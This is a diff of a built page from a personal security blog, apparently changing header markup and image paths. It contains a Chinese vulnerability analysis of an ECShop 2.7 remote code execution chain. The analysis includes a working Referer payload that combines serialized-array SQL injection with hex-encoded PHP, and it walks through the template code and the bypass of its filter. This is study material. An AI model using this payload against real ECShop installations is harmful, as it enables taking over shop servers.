@@ -44,286 +44,93 @@
     <div class="page-main-content">
 
         <div class="page-main-content-top">
-            $logo-title-font-size = 2.2rem;
-$pc-search-icon-font-size = 1.5rem;
-$menu-bar-line-height = 2.5px;
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
 
-.header-wrapper {
-  width: 100%;
-  height: 100%;
-  box-sizing: border-box;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: var(--background-color);
-  padding-top: $scroll-progress-bar-height;
-
-  hover-style(false, 0, 0);
-
-  .header-content {
-    position: relative;
-    height: 100%;
-    width: $main-content-width;
-    max-width: $content-max-width;
-    display: flex;
-    flex-direction: row;
-    justify-content: space-between;
-    align-items: center;
-    z-index: $z-index-5;
-
-
-    &.has-first-screen {
-      max-width: $content-max-width * 1.2;
-    }
-
-    +keep-tablet() {
-      width: $main-content-width-tablet;
-    }
-
-    +keep-mobile() {
-      width: $main-content-width-mobile;
-    }
-
-    .left {
-      display: flex;
-      align-items: center;
-      transition-t("transform", "0", "0.2", "linear");
-
-      .header-shrink & {
-        transform: scale(0.85);
-        transform-origin: left;
-
-      }
-
-      .logo-title {
-        font-size: $logo-title-font-size;
-        font-weight: bold;
-        letter-spacing: 1px;
-        line-height: 1;
-        color: var(--first-text-color);
-
-        +keep-tablet() {
-          font-size: $logo-title-font-size * 0.9;
-        }
-
-        +keep-mobile() {
-          font-size: $logo-title-font-size * 0.8;
-        }
-      }
-    }
-
-
-    .right {
-
-      .pc {
-
-        .menu-list {
-          display: flex;
-          align-items: center;
-
-          +keep-tablet() {
-            display: none;
-          }
-
-
-          .menu-item {
-            float: left;
-            position: relative;
-            margin-left: 30px;
-            font-size: 1rem;
-            cursor: pointer;
-            color: var(--default-text-color);
-
-            &:first-child {
-              margin-left: 0;
-            }
-
-
-            a:hover, .active {
-
-              &::after {
-                content: '';
-                position: absolute;
-                bottom: -10px;
-                left: 50%;
-                width: 100%;
-                height: 2px;
-                transform: translateX(-50%);
-                background: var(--primary-color);
-                transition-t("transform, bottom", "0, 0", "0.2, 0.2", "linear, linear");
-
-                .header-shrink & {
-                  bottom: -($header-shrink-height / 2 - 12);
-                }
-              }
-            }
-
-            &.search {
-              font-size: $pc-search-icon-font-size;
-              margin-left: 26px;
-
-              i {
-                color: var(--default-text-color);
-              }
-
-            }
-          }
-
-
-        }
-
-      }
-
-
-      .mobile {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-
-        .icon-item {
-          display: none;
-          position: relative;
-          cursor: pointer;
-          font-size: 18px;
-          margin-left: 12px;
-          width: 20px;
-          height: 20px;
-          color: var(--default-text-color);
-
-          i {
-            color: var(--default-text-color);
-          }
-
-          &:first-child {
-            margin-left: 0;
-          }
-
-          +keep-tablet() {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-          }
-        }
-
-        .menu-bar {
-
-          .menu-bar-middle {
-            width: 18px;
-            height: $menu-bar-line-height;
-            position: relative;
-            background: var(--default-text-color);
-
-            .header-drawer-show & {
-              background: transparent;
-            }
-
-
-            &::before, &::after {
-              content: '';
-              position: absolute;
-              left: 0;
-              width: 100%;
-              height: $menu-bar-line-height;
-              background: var(--default-text-color);
-              transition-t("transform", "0", "0.38", "ease");
-            }
-
-
-            &::before {
-              top: -6px;
-
-              .header-drawer-show & {
-                transform: translateY(6px) rotate(45deg);
-              }
-            }
-
-
-            &::after {
-              bottom: -6px;
-
-              .header-drawer-show & {
-                transform: translateY(-6px) rotate(-45deg);
-              }
-            }
-          }
-        }
-      }
-    }
-  }
-
-
-  .header-drawer {
-    width: 100%;
-    padding: $header-height 0 20px 0;
-    position: absolute;
-    top: 0;
-    left: 0;
-    transform: scaleY(0);
-    transform-origin: top;
-    z-index: $z-index-2;
-    background: var(--background-color);
-    transition-t("transform", "0", "0.38", "ease");
-
-    .header-drawer-show & {
-      transform: scaleY(1);
-    }
-
-    .drawer-menu-list {
-      display: flex;
-      flex-direction: column;
-      justify-content: flex-start;
-      align-items: center;
-
-      .drawer-menu-item {
-        font-size: 1rem;
-        margin: 6px 0;
-        height: 38px;
-
-        a {
-          padding: 6px 20px;
-          border-radius: 20px;
-          color: var(--default-text-color);
-
-          &:hover {
-            color: var(--second-text-color);
-            border: 1px solid var(--default-text-color);
-          }
-
-
-          &.active {
-            border: 1px solid var(--default-text-color);
-            color: var(--second-text-color);
-          }
-        }
-
-
-      }
-    }
-  }
-
-
-  .window-mask {
-    position: absolute;
-    top: 0;
-    width: 100%;
-    height: 100vh;
-    background: rgba(0, 0, 0, 0.4);
-    z-index: $z-index-1;
-    visibility: hidden;
-    opacity: 0;
-    transition-t("transform, opacity", "0, 0", "0.38, 0.38", "ease, ease");
-
-    .header-drawer-show & {
-      visibility: visible;
-      opacity: 1;
-    }
-  }
-
-}
-
-.header-drawer-show {
-  overflow: hidden;
-}
 
         </div>
 
@@ -388,7 +195,7 @@ $menu-bar-line-height = 2.5px;
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ecshop&#x2F;upload&#x2F;user.php?act&#x3D;login</span><br><span class="line"></span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:84:&quot;*&#x2F;union select 1,0x272f2a,4,4,5,6,7,8,0x7b24275d3b706870696e666f2f2a2a2f28292f2f7d,0&quot;;s:2:&quot;id&quot;;s:3:&quot;&#39;&#x2F;*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca|a:2:&#123;s:3:&quot;num&quot;;s:68:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/2021/01/25/EcShop2-7RCE/EcShop2-7RCE%5C1.png" alt="1"></p>
+<p><img src="/2021/01/25/EcShop2-7RCE/1.png" alt="1"></p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞的触发点在upload/user.php中的325行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smarty</span>-&gt;assign(<span class="string">&#x27;back_act&#x27;</span>, <span class="variable">$back_act</span>);</span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;user_passport.dwt&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
@@ -438,7 +245,7 @@ $menu-bar-line-height = 2.5px;
 <p>回到display方法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$out</span>, <span class="keyword">$this</span>-&gt;_echash) !== <span class="literal">false</span>)<span class="comment">//这个会检测out中有没有_echash， _echash在类中已经定义  var $_echash        = &#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;;</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = explode(<span class="keyword">$this</span>-&gt;_echash, <span class="variable">$out</span>);<span class="comment">//根据_echash把out拆分成数组，</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$k</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)<span class="comment">//遍历数组</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$key</span> % <span class="number">2</span>) == <span class="number">1</span>)<span class="comment">//余数为1，这里的key是0 1这种普通数组，所以会把第二个值传入insert_mod方法中</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$k</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;insert_mod(<span class="variable">$val</span>);<span class="comment">//重点在这，看一下</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$out</span> = implode(<span class="string">&#x27;&#x27;</span>, <span class="variable">$k</span>);<span class="comment">//把k中的内容，根据&#x27;&#x27;连成一个字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">    error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_seterror--;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$out</span>;<span class="comment">//把out输出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>看一下经过explode拆分之后的数组</p>
-<p><img src="/2021/01/25/EcShop2-7RCE/EcShop2-7RCE%5C2.png" alt="2"></p>
+<p><img src="/2021/01/25/EcShop2-7RCE/2.png" alt="2"></p>
 <p>看一下out  这里面会有几个554fcae493e564ee0dc75bdf2ebf94ca  用来分割用</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;title&gt;用户中心_ECSHOP演示站 - Powered by ECShop&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;link rel&#x3D;&quot;shortcut icon&quot; href&#x3D;&quot;favicon.ico&quot; &#x2F;&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;icon&quot; href&#x3D;&quot;animated_favicon.gif&quot; type&#x3D;&quot;image&#x2F;gif&quot; &#x2F;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;themes&#x2F;default&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;common.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;user.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;transport.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">var process_request &#x3D; &quot;正在处理您的请求...&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;block clearfix&quot;&gt;</span><br><span class="line"> &lt;div class&#x3D;&quot;f_l&quot;&gt;&lt;a href&#x3D;&quot;index.php&quot; name&#x3D;&quot;top&quot;&gt;&lt;img src&#x3D;&quot;themes&#x2F;default&#x2F;images&#x2F;logo.gif&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;div class&#x3D;&quot;f_r log&quot;&gt;</span><br><span class="line">   &lt;ul&gt;</span><br><span class="line">   &lt;li class&#x3D;&quot;userInfo&quot;&gt;</span><br><span class="line">   &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;utils.js&quot;&gt;&lt;&#x2F;script&gt;   &lt;font id&#x3D;&quot;ECS_MEMBERZONE&quot;&gt;554fcae493e564ee0dc75bdf2ebf94camember_info|a:1:&#123;s:4:&quot;name&quot;;s:11:&quot;member_info&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca &lt;&#x2F;font&gt;</span><br></pre></td></tr></table></figure>
 
@@ -446,7 +253,7 @@ $menu-bar-line-height = 2.5px;
 <p>跟进insert_mod方法，直接就看见一个动态函数</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span>(<span class="params"><span class="variable">$name</span></span>) // 处理动态内容</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$fun</span>, <span class="variable">$para</span>) = explode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$name</span>);<span class="comment">//name是编译后的模板返回的东西，函数名在右，参数名在左</span></span><br><span class="line">    <span class="comment">//即|前面的是参数，|后面的是要拼接的函数名</span></span><br><span class="line">        <span class="variable">$para</span> = unserialize(<span class="variable">$para</span>);<span class="comment">//反序列化是一个数组</span></span><br><span class="line">        <span class="variable">$fun</span> = <span class="string">&#x27;insert_&#x27;</span> . <span class="variable">$fun</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fun</span>(<span class="variable">$para</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>看一下效果</p>
-<p><img src="/2021/01/25/EcShop2-7RCE/EcShop2-7RCE%5C3.png" alt="3"></p>
+<p><img src="/2021/01/25/EcShop2-7RCE/3.png" alt="3"></p>
 <p>这是display方法的一个正常的执行流程</p>
 <p>代入payload分析一下</p>
 <p>进入到insert_ads方法  这个方法的参数arr 是刚刚的para，</p>
@@ -465,7 +272,7 @@ $menu-bar-line-height = 2.5px;
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$position_style</span> = <span class="variable">$row</span>[<span class="string">&#x27;position_style&#x27;</span>];</span><br></pre></td></tr></table></figure>
 <p>来自sql查询结果的第9列  所以刚刚分割注入的payload第九列  是要执行的代码，数据库是可以识别16进制的（为了防止乱码，还有格式问题，16进制编码了一下）</p>
 <h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>这一次fetch会把phpinfo带入执行</p>
-<p><img src="/2021/01/25/EcShop2-7RCE/EcShop2-7RCE%5C5.png" alt="5"></p>
+<p><img src="/2021/01/25/EcShop2-7RCE/5.png" alt="5"></p>
 <p>fetch方法是把fetch_str方法的返回值，传给了_eval方法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 处理字符串函数</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@access</span>  public</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span>   string     $source</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span>  sring</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">fetch_str</span>(<span class="params"><span class="variable">$source</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!defined(<span class="string">&#x27;ECS_ADMIN&#x27;</span>))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="variable">$source</span> = <span class="keyword">$this</span>-&gt;smarty_prefilter_preCompile(<span class="variable">$source</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$source</span>=preg_replace(<span class="string">&quot;/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$source</span>);</span><br><span class="line">      <span class="keyword">if</span>(preg_match_all(<span class="string">&#x27;~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\&quot;\&#x27;]?php[\&quot;\&#x27;]?)~is&#x27;</span>, <span class="variable">$source</span>, <span class="variable">$sp_match</span>))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="variable">$sp_match</span>[<span class="number">1</span>] = array_unique(<span class="variable">$sp_match</span>[<span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">for</span> (<span class="variable">$curr_sp</span> = <span class="number">0</span>, <span class="variable">$for_max2</span> = count(<span class="variable">$sp_match</span>[<span class="number">1</span>]); <span class="variable">$curr_sp</span> &lt; <span class="variable">$for_max2</span>; <span class="variable">$curr_sp</span>++)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="variable">$source</span> = str_replace(<span class="variable">$sp_match</span>[<span class="number">1</span>][<span class="variable">$curr_sp</span>],<span class="string">&#x27;%%%SMARTYSP&#x27;</span>.<span class="variable">$curr_sp</span>.<span class="string">&#x27;%%%&#x27;</span>,<span class="variable">$source</span>);</span><br><span class="line">          &#125;</span><br><span class="line">           <span class="keyword">for</span> (<span class="variable">$curr_sp</span> = <span class="number">0</span>, <span class="variable">$for_max2</span> = count(<span class="variable">$sp_match</span>[<span class="number">1</span>]); <span class="variable">$curr_sp</span> &lt; <span class="variable">$for_max2</span>; <span class="variable">$curr_sp</span>++)</span><br><span class="line">          &#123;</span><br><span class="line">               <span class="variable">$source</span>= str_replace(<span class="string">&#x27;%%%SMARTYSP&#x27;</span>.<span class="variable">$curr_sp</span>.<span class="string">&#x27;%%%&#x27;</span>, <span class="string">&#x27;&lt;?php echo \&#x27;&#x27;</span>.str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, <span class="variable">$sp_match</span>[<span class="number">1</span>][<span class="variable">$curr_sp</span>]).<span class="string">&#x27;\&#x27;; ?&gt;&#x27;</span>.<span class="string">&quot;\n&quot;</span>, <span class="variable">$source</span>);</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> preg_replace(<span class="string">&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;</span>, <span class="string">&quot;\$this-&gt;select(&#x27;\\1&#x27;);&quot;</span>, <span class="variable">$source</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 <p>这里有两个正则分析了一下</p>
@@ -489,7 +296,7 @@ $menu-bar-line-height = 2.5px;
 
 
 <p>最后执行带入是这样的</p>
-<p><img src="/2021/01/25/EcShop2-7RCE/EcShop2-7RCE%5C6.png" alt="6"></p>
+<p><img src="/2021/01/25/EcShop2-7RCE/6.png" alt="6"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用链</p>
 <p>user.php下控制action、back_act，触发assign方法，</p>
 <p>cls_template.php  assign方法赋值back_act   </p>
@@ -498,7 +305,7 @@ $menu-bar-line-height = 2.5px;
 <p>执行insert_ads方法，分割注入，拿到   </p>
 <p>执行fetch方法，调用fetch_str方法，第一个正则（/**/绕过），第二个正则提取参数</p>
 <p>调用select方法 ，调用get_val方法，调用make_val方法，进行代码拼接</p>
-<p><img src="/2021/01/25/EcShop2-7RCE/EcShop2-7RCE%5C7.png" alt="7"></p>
+<p><img src="/2021/01/25/EcShop2-7RCE/7.png" alt="7"></p>
 
         </div>
 
